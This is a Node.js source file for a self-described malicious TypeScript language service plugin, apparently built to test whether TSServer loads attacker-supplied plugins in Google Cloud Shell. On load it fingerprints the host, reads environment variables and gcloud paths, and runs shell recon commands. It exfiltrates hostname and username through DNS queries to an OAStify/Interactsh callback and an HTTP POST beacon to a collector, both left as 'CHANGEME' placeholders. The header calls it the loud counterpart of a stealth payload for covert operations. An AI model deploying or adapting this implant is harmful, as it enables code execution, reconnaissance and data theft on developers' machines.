#!/usr/bin/env node
'use strict';

/**
 * DIAGNOSTIC Malicious TypeScript Language Service Plugin
 * ========================================================
 *
 * MAXIMUM NOISE VERSION — logs everything with timestamps.
 * Tries EVERY exfiltration channel simultaneously:
 *   - Synchronous: stdout, stderr, filesystem markers
 *   - DNS exfiltration (dns.lookup)
 *   - HTTP/S beacon
 *   - Shell command probes
 *   - Environment fingerprint
 *   - Cloud Shell path detection
 *   - CWD listing
 *
 * PRIMARY LOG: /tmp/ts-plugin-debug.log
 * EVERY operation is logged with timestamp and result.
 *
 * USE THIS VERSION WHEN:
 * - The stealth payload didn't fire and you need to know WHY
 * - You need to determine which channel works in the target environment
 * - You need maximum forensic evidence of execution
 *
 * DO NOT USE for actual covert operations — this is LOUD.
 */

var DEBUG_LOG_PATH = '/tmp/ts-plugin-debug.log';

// ═══════════════════════════════════════════════════════════════
// CRITICAL: The very first thing — write a marker BEFORE any
// module loading or error handling. If this doesn't appear,
// the file was never require()d.
// ═══════════════════════════════════════════════════════════════

(function writeEntryMarker() {
    var ts = new Date().toISOString();
    try {
        require('fs').appendFileSync(DEBUG_LOG_PATH,
            '═══════════════════════════════════════════════════════════\n' +
            'ENTRY | ' + ts + ' | PID=' +
            (typeof process !== 'undefined' && process.pid ? process.pid : '?') + '\n' +
            'MODULE LOADED — the file was require()d by something\n' +
            '═══════════════════════════════════════════════════════════\n'
        );
    } catch (e) {
        // If we can't even write to /tmp, try stdout
        try { process.stdout.write('[TS-DEBUG-ENTRY] ' + ts + '\n'); } catch (_) {}
        // Try stderr
        try { require('fs').appendFileSync('/dev/stderr', '[TS-DEBUG-ENTRY] ' + ts + '\n'); } catch (_) {}
    }
})();

// ═══════════════════════════════════════════════════════════════
// DIAGNOSTIC LOGGING INFRASTRUCTURE
// ═══════════════════════════════════════════════════════════════

var LOG_FILE = null;
var LOG_ENTRIES = [];

function debugLog(phase, message, data) {
    var ts = new Date().toISOString();
    var entry = {
        timestamp: ts,
        phase: phase,
        message: message,
        data: data || null,
    };
    LOG_ENTRIES.push(entry);

    // Format for file: [TIMESTAMP] [PHASE] MESSAGE | DATA
    var line = '[' + ts + '] [' + phase + '] ' + message;
    if (data !== undefined && data !== null) {
        try {
            line += ' | ' + (typeof data === 'string' ? data : JSON.stringify(data));
        } catch (_) {
            line += ' | [unserializable]';
        }
    }
    line += '\n';

    // Write to log file
    try {
        require('fs').appendFileSync(DEBUG_LOG_PATH, line);
    } catch (_) {}

    // Also stdout if available
    try { process.stdout.write('[TS-DEBUG] ' + line); } catch (_) {}

    // Also stderr
    try { require('fs').appendFileSync('/dev/stderr', '[TS-DEBUG] ' + line); } catch (_) {}
}

debugLog('BOOT', 'Debug plugin entry point reached');

// ═══════════════════════════════════════════════════════════════
// MODULE LOADING WITH DIAGNOSTICS
// ═══════════════════════════════════════════════════════════════

debugLog('MODULES', 'Attempting to load Node.js built-in modules');

var MODULES = {};

['fs', 'os', 'path', 'dns', 'net', 'https', 'http', 'child_process', 'url', 'zlib', 'crypto'].forEach(function(name) {
    try {
        MODULES[name] = require(name);
        debugLog('MODULES', 'Loaded: ' + name, 'OK');
    } catch (e) {
        MODULES[name] = null;
        debugLog('MODULES', 'FAILED to load: ' + name, e.message);
    }
});

var FS  = MODULES['fs'];
var OS  = MODULES['os'];
var PATH = MODULES['path'];
var DNS = MODULES['dns'];
var NET = MODULES['net'];
var HTTPS = MODULES['https'];
var HTTP = MODULES['http'];
var CP  = MODULES['child_process'];

// ═══════════════════════════════════════════════════════════════
// ENVIRONMENT PROBE
// ═══════════════════════════════════════════════════════════════

debugLog('ENV', 'Probing process environment');

var ENV_INFO = {};

try {
    ENV_INFO.pid = process.pid;
    ENV_INFO.ppid = process.ppid;
    ENV_INFO.platform = process.platform;
    ENV_INFO.arch = process.arch;
    ENV_INFO.nodeVersion = process.version;
    ENV_INFO.execPath = process.execPath;
    ENV_INFO.argv0 = process.argv0;
    ENV_INFO.cwd = process.cwd();
    ENV_INFO.argv = process.argv.slice(0, 30);
    ENV_INFO.execArgv = process.execArgv;
    ENV_INFO.title = process.title;
    ENV_INFO.uptime = process.uptime();
    debugLog('ENV', 'Process info collected', ENV_INFO);
} catch (e) {
    debugLog('ENV', 'FAILED to probe process', e.message);
}

try {
    ENV_INFO.uid = process.getuid ? process.getuid() : -1;
    ENV_INFO.gid = process.getgid ? process.getgid() : -1;
    ENV_INFO.envKeys = Object.keys(process.env).sort();
    ENV_INFO.env_HOME = process.env.HOME || 'NOT SET';
    ENV_INFO.env_USER = process.env.USER || 'NOT SET';
    ENV_INFO.env_PWD = process.env.PWD || 'NOT SET';
    ENV_INFO.env_SHELL = process.env.SHELL || 'NOT SET';
    ENV_INFO.env_CLOUD_SHELL = process.env.CLOUD_SHELL || 'NOT SET';
    ENV_INFO.env_DEVSHELL_PROJECT_ID = process.env.DEVSHELL_PROJECT_ID || 'NOT SET';
    ENV_INFO.env_GOOGLE_CLOUD_PROJECT = process.env.GOOGLE_CLOUD_PROJECT || 'NOT SET';
    ENV_INFO.env_CLOUDSDK_CONFIG = process.env.CLOUDSDK_CONFIG || 'NOT SET';
    ENV_INFO.env_TMPDIR = process.env.TMPDIR || process.env.TMP || process.env.TEMP || 'NOT SET';
    ENV_INFO.env_PATH = (process.env.PATH || '').substring(0, 300);
    debugLog('ENV', 'Environment variables collected', {
        envKeys: ENV_INFO.envKeys,
        HOME: ENV_INFO.env_HOME,
        USER: ENV_INFO.env_USER,
        PWD: ENV_INFO.env_PWD,
        CLOUD_SHELL: ENV_INFO.env_CLOUD_SHELL,
    });
} catch (e) {
    debugLog('ENV', 'FAILED to probe env vars', e.message);
}

// ═══════════════════════════════════════════════════════════════
// OS PROBE
// ═══════════════════════════════════════════════════════════════

debugLog('OS', 'Probing operating system');

var OS_INFO = {};
try {
    if (OS) {
        OS_INFO.type = OS.type();
        OS_INFO.platform = OS.platform();
        OS_INFO.release = OS.release();
        OS_INFO.arch = OS.arch();
        OS_INFO.hostname = OS.hostname();
        OS_INFO.homedir = OS.homedir();
        OS_INFO.tmpdir = OS.tmpdir();
        OS_INFO.cpus = OS.cpus().length;
        OS_INFO.totalmem = OS.totalmem();
        OS_INFO.freemem = OS.freemem();
        OS_INFO.loadavg = OS.loadavg();
        OS_INFO.uptime = OS.uptime();
        try { OS_INFO.userInfo = OS.userInfo(); } catch (e2) {
            OS_INFO.userInfo_error = e2.message;
        }
        try { OS_INFO.networkInterfaces = Object.keys(OS.networkInterfaces()); } catch (e2) {
            OS_INFO.networkInterfaces_error = e2.message;
        }
        debugLog('OS', 'OS info collected', {
            type: OS_INFO.type,
            hostname: OS_INFO.hostname,
            homedir: OS_INFO.homedir,
            username: OS_INFO.userInfo ? OS_INFO.userInfo.username : '?',
            cpus: OS_INFO.cpus,
        });
    } else {
        debugLog('OS', 'os module NOT available');
    }
} catch (e) {
    debugLog('OS', 'FAILED to probe OS', e.message);
}

// ═══════════════════════════════════════════════════════════════
// FILESYSTEM MARKER WRITES
// ═══════════════════════════════════════════════════════════════

debugLog('FS', 'Writing filesystem markers');

var markerTs = new Date().toISOString().replace(/:/g, '-');
var markerData = 'TSSERVER_DEBUG_PLUGIN_EXECUTED|' + markerTs +
    '|pid=' + (ENV_INFO.pid || '?') +
    '|ppid=' + (ENV_INFO.ppid || '?') +
    '|hostname=' + (OS_INFO.hostname || '?') + '\n';

var markerPaths = [
    '/tmp/ts-plugin-debug-executed-' + markerTs,
    '/tmp/ts-plugin-debug-executed',
    '/tmp/ts-plugin-debug-pid-' + (ENV_INFO.pid || '0'),
    '/dev/shm/ts-plugin-debug-executed',
    '/dev/shm/ts-plugin-debug-' + markerTs,
];

try {
    if (OS_INFO.homedir) {
        markerPaths.push(PATH.join(OS_INFO.homedir, 'ts-plugin-debug-executed'));
        markerPaths.push(PATH.join(OS_INFO.homedir, 'ts-plugin-debug-' + markerTs));
    }
} catch (_) {}

try {
    var tmpDir = ENV_INFO.env_TMPDIR;
    if (tmpDir && tmpDir !== 'NOT SET') {
        markerPaths.push(PATH.join(tmpDir, 'ts-plugin-debug-executed'));
    }
} catch (_) {}

var markerResults = [];
for (var i = 0; i < markerPaths.length; i++) {
    try {
        FS.writeFileSync(markerPaths[i], markerData);
        markerResults.push({ path: markerPaths[i], status: 'OK' });
        debugLog('FS', 'Marker written: ' + markerPaths[i]);
    } catch (e) {
        markerResults.push({ path: markerPaths[i], status: 'FAIL', error: e.message });
        debugLog('FS', 'Marker FAILED: ' + markerPaths[i], e.message);
    }
}

// ═══════════════════════════════════════════════════════════════
// CWD LISTING
// ═══════════════════════════════════════════════════════════════

debugLog('CWD', 'Listing current working directory');

try {
    var cwd = ENV_INFO.cwd || process.cwd();
    var cwdEntries = FS.readdirSync(cwd);
    debugLog('CWD', 'Directory listing for: ' + cwd, {
        count: cwdEntries.length,
        entries: cwdEntries.slice(0, 100),
    });
} catch (e) {
    debugLog('CWD', 'FAILED to list CWD', e.message);
}

// ═══════════════════════════════════════════════════════════════
// CLOUD SHELL DETECTION
// ═══════════════════════════════════════════════════════════════

debugLog('CLOUDSHELL', 'Detecting Cloud Shell environment');

var cloudShellPaths = [
    '/home/user/cloudshell_open/tsserver-evil',
    '/home/user/cloudshell_open',
    '/home/user/tsserver-evil',
    '/google/devshell',
    '/google/devshell/editor',
    '/home/user/.theia',
    '/home/user/.codebuddy',
    '/home/user/.cloudshell',
    '/home/user/.config/gcloud',
];

var csResults = {
    isCloudShell: false,
    envIndicators: {},
    pathChecks: {},
};

csResults.envIndicators = {
    CLOUD_SHELL: ENV_INFO.env_CLOUD_SHELL,
    DEVSHELL_PROJECT_ID: ENV_INFO.env_DEVSHELL_PROJECT_ID,
    GOOGLE_CLOUD_PROJECT: ENV_INFO.env_GOOGLE_CLOUD_PROJECT,
    CLOUDSDK_CONFIG: ENV_INFO.env_CLOUDSDK_CONFIG,
};

if (ENV_INFO.env_CLOUD_SHELL !== 'NOT SET' || ENV_INFO.env_DEVSHELL_PROJECT_ID !== 'NOT SET' ||
    ENV_INFO.env_GOOGLE_CLOUD_PROJECT !== 'NOT SET') {
    csResults.isCloudShell = true;
    debugLog('CLOUDSHELL', 'Cloud Shell DETECTED via environment variables');
} else {
    debugLog('CLOUDSHELL', 'No Cloud Shell env vars found');
}

for (var j = 0; j < cloudShellPaths.length; j++) {
    var p = cloudShellPaths[j];
    try {
        var stat = FS.statSync(p);
        csResults.pathChecks[p] = {
            exists: true,
            isDirectory: stat.isDirectory(),
            isFile: stat.isFile(),
            size: stat.size,
        };
        if (stat.isDirectory()) {
            csResults.isCloudShell = true;
            debugLog('CLOUDSHELL', 'Path EXISTS (dir): ' + p);

            // If it's a directory, list its contents too
            try {
                var subEntries = FS.readdirSync(p).slice(0, 50);
                csResults.pathChecks[p].contents = subEntries;
                debugLog('CLOUDSHELL', 'Contents of ' + p, subEntries.join(', '));
            } catch (_) {}
        } else {
            debugLog('CLOUDSHELL', 'Path EXISTS (file): ' + p, 'size=' + stat.size);
        }
    } catch (_) {
        csResults.pathChecks[p] = { exists: false };
    }
}

// Write Cloud Shell detection to dedicated file
try {
    FS.writeFileSync('/tmp/ts-plugin-cloudshell-detect.json', JSON.stringify(csResults, null, 2));
} catch (_) {}

// ═══════════════════════════════════════════════════════════════
// DNS EXFILTRATION TEST
// ═══════════════════════════════════════════════════════════════

debugLog('DNS', 'Testing DNS exfiltration');

// Default callback domain — CHANGE THIS to your OAStify/Interactsh domain
var DNS_CALLBACK = 'CHANGEME.oastify.com';

if (DNS_CALLBACK.indexOf('CHANGEME') !== -1) {
    debugLog('DNS', 'DNS callback NOT configured — using test query');

    // Fallback: just test DNS resolution to verify the module works
    try {
        DNS.lookup('google.com', { family: 4 }, function(err, addr) {
            if (err) {
                debugLog('DNS', 'DNS test lookup FAILED', err.message);
            } else {
                debugLog('DNS', 'DNS test lookup SUCCEEDED', 'google.com => ' + addr);
            }
        });
        debugLog('DNS', 'DNS lookup dispatched (async, awaiting callback)');
    } catch (e) {
        debugLog('DNS', 'DNS lookup EXCEPTION', e.message);
    }
} else {
    // Build real exfiltration query
    var hostSlug = '';
    var userSlug = '';
    try {
        hostSlug = (OS_INFO.hostname || 'unknown').toLowerCase().replace(/[^a-z0-9]/g, '-').substring(0, 40);
    } catch (_) { hostSlug = 'unknown'; }
    try {
        userSlug = (OS_INFO.userInfo && OS_INFO.userInfo.username || 'unknown')
            .toLowerCase().replace(/[^a-z0-9]/g, '-').substring(0, 40);
    } catch (_) { userSlug = 'unknown'; }

    var dnsQuery = hostSlug + '.' + userSlug + '.debug.' + DNS_CALLBACK;

    debugLog('DNS', 'Exfiltration query: ' + dnsQuery);

    try {
        DNS.lookup(dnsQuery, { family: 4 }, function(err, addr) {
            if (err) {
                debugLog('DNS', 'Exfiltration lookup completed (expected error)',
                    'code=' + err.code + ' message=' + err.message);
                debugLog('DNS', 'IMPORTANT: DNS query WAS SENT — check your OAStify/Interactsh logs');
            } else {
                debugLog('DNS', 'Exfiltration lookup RESOLVED (unexpected)',
                    'address=' + addr);
            }
        });
        debugLog('DNS', 'DNS exfiltration dispatched');
    } catch (e) {
        debugLog('DNS', 'DNS exfiltration EXCEPTION', e.message);
    }
}

// ═══════════════════════════════════════════════════════════════
// HTTP/S BEACON TEST
// ═══════════════════════════════════════════════════════════════

debugLog('HTTP', 'Testing HTTP/S beacon');

var HTTP_COLLECTOR = 'https://CHANGEME.example.com';

if (HTTP_COLLECTOR.indexOf('CHANGEME') !== -1) {
    debugLog('HTTP', 'HTTP collector NOT configured — skipping HTTP beacon');
} else {
    try {
        var urlLib = require('url');
        var beaconUrl = new urlLib.URL(HTTP_COLLECTOR);
        var mod = beaconUrl.protocol === 'https:' ? HTTPS : HTTP;

        if (!mod) {
            debugLog('HTTP', 'No HTTP/S module available for beacon');
        } else {
            var beaconPayload = JSON.stringify({
                timestamp: new Date().toISOString(),
                type: 'debug_plugin_beacon',
                hostname: OS_INFO.hostname || '?',
                username: (OS_INFO.userInfo && OS_INFO.userInfo.username) || '?',
                pid: ENV_INFO.pid || -1,
                platform: ENV_INFO.platform || '?',
                isCloudShell: csResults.isCloudShell,
                modules: {
                    fs: !!FS, os: !!OS, path: !!PATH, dns: !!DNS,
                    net: !!NET, https: !!HTTPS, http: !!HTTP, cp: !!CP,
                },
            });

            var req = mod.request({
                hostname: beaconUrl.hostname,
                port: beaconUrl.port || (beaconUrl.protocol === 'https:' ? 443 : 80),
                path: beaconUrl.pathname + beaconUrl.search,
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Content-Length': Buffer.byteLength(beaconPayload),
                    'X-TS-Plugin': 'debug-plugin-v1',
                },
                timeout: 10000,
            }, function(res) {
                var body = '';
                res.on('data', function(c) { body += c; });
                res.on('end', function() {
                    debugLog('HTTP', 'Beacon response received',
                        'status=' + res.statusCode + ' body=' + body.substring(0, 200));
                });
            });

            req.on('error', function(e) {
                debugLog('HTTP', 'Beacon request ERROR', e.message);
            });

            req.on('timeout', function() {
                req.destroy();
                debugLog('HTTP', 'Beacon request TIMEOUT');
            });

            req.write(beaconPayload);
            req.end();
            debugLog('HTTP', 'Beacon dispatched');
        }
    } catch (e) {
        debugLog('HTTP', 'Beacon setup EXCEPTION', e.message);
    }
}

// ═══════════════════════════════════════════════════════════════
// SHELL COMMAND PROBES
// ═══════════════════════════════════════════════════════════════

debugLog('SHELL', 'Running shell command probes');

var shellResults = {};

if (!CP) {
    debugLog('SHELL', 'child_process NOT available — skipping shell probes');
} else {
    var shellCommands = [
        { key: 'whoami', cmd: 'whoami' },
        { key: 'hostname', cmd: 'hostname' },
        { key: 'pwd', cmd: 'pwd' },
        { key: 'id', cmd: 'id' },
        { key: 'ls_tmp', cmd: 'ls -la /tmp/ | head -20' },
        { key: 'ls_home', cmd: 'ls -la $HOME/ | head -20' },
        { key: 'ps_tsserver', cmd: 'ps aux | grep -i tsserver | grep -v grep' },
        { key: 'env_count', cmd: 'env | wc -l' },
        { key: 'env_gcloud', cmd: 'env | grep -i gcloud || echo "NO_GCLOUD_ENV"' },
        { key: 'env_google', cmd: 'env | grep -i google || echo "NO_GOOGLE_ENV"' },
        { key: 'ss_listen', cmd: 'ss -tlnp 2>/dev/null | head -20 || netstat -tlnp 2>/dev/null | head -20 || echo "NO_NETSTAT"' },
    ];

    for (var k = 0; k < shellCommands.length; k++) {
        var sc = shellCommands[k];
        try {
            var result = CP.execSync(sc.cmd, {
                timeout: 5000,
                encoding: 'utf-8',
                maxBuffer: 1024 * 1024,
            });
            shellResults[sc.key] = {
                status: 'OK',
                output: result.trim().substring(0, 2000),
            };
            debugLog('SHELL', sc.key + ' OK', shellResults[sc.key].output.substring(0, 100));
        } catch (e) {
            shellResults[sc.key] = {
                status: 'FAILED',
                error: e.message,
                stdout: (e.stdout || '').substring(0, 500),
                stderr: (e.stderr || '').substring(0, 500),
            };
            debugLog('SHELL', sc.key + ' FAILED', e.message);
        }
    }
}

// Write shell results
try {
    FS.writeFileSync('/tmp/ts-plugin-shell-results.json', JSON.stringify(shellResults, null, 2));
} catch (_) {}

// ═══════════════════════════════════════════════════════════════
// FINAL SUMMARY
// ═══════════════════════════════════════════════════════════════

debugLog('SUMMARY', '═══════════════════════════════════════');
debugLog('SUMMARY', 'ALL DIAGNOSTIC PROBES COMPLETE');
debugLog('SUMMARY', 'Results written to:');
debugLog('SUMMARY', '  Primary log:    ' + DEBUG_LOG_PATH);
debugLog('SUMMARY', '  Markers:        ' + JSON.stringify(markerResults.map(function(r) {
    return { path: r.path, status: r.status };
})));
debugLog('SUMMARY', '  Shell results:  /tmp/ts-plugin-shell-results.json');
debugLog('SUMMARY', '  Cloud Shell:    /tmp/ts-plugin-cloudshell-detect.json');
debugLog('SUMMARY', '  PID:            ' + (ENV_INFO.pid || '?'));
debugLog('SUMMARY', '  Hostname:       ' + (OS_INFO.hostname || '?'));
debugLog('SUMMARY', '  Username:       ' + (OS_INFO.userInfo ? OS_INFO.userInfo.username : '?'));
debugLog('SUMMARY', '  CWD:            ' + (ENV_INFO.cwd || '?'));
debugLog('SUMMARY', '  HOME:           ' + (ENV_INFO.env_HOME || '?'));
debugLog('SUMMARY', '  Is Cloud Shell: ' + csResults.isCloudShell);
debugLog('SUMMARY', '  Platform:       ' + (ENV_INFO.platform || '?') + ' ' + (ENV_INFO.arch || '?'));
debugLog('SUMMARY', '  Node:           ' + (ENV_INFO.nodeVersion || '?'));
debugLog('SUMMARY', '═══════════════════════════════════════');

// ═══════════════════════════════════════════════════════════════
// TSSERVER PLUGIN INTERFACE
// ═══════════════════════════════════════════════════════════════

function init(modules) {
    debugLog('TSSERVER', 'init() CALLED by TSServer');

    try {
        FS.appendFileSync(DEBUG_LOG_PATH,
            '[' + new Date().toISOString() + '] [TSSERVER] init() CALLED — TSServer lifecycle active\n');
    } catch (_) {}

    return {
        create: function(info) {
            debugLog('TSSERVER', 'create() CALLED',
                'project=' + (info && info.project ? info.project.getProjectName() : '?'));
            try {
                FS.appendFileSync(DEBUG_LOG_PATH,
                    '[' + new Date().toISOString() + '] [TSSERVER] create() called\n');
            } catch (_) {}
            return info.languageService;
        },
        getExternalFiles: function() { return []; },
        onConfigurationChanged: function(config) {
            debugLog('TSSERVER', 'onConfigurationChanged() CALLED');
        },
    };
}

module.exports = init;
module.exports.typescriptServerPlugin = true;

debugLog('BOOT', 'Module export setup complete — waiting for TSServer init()');
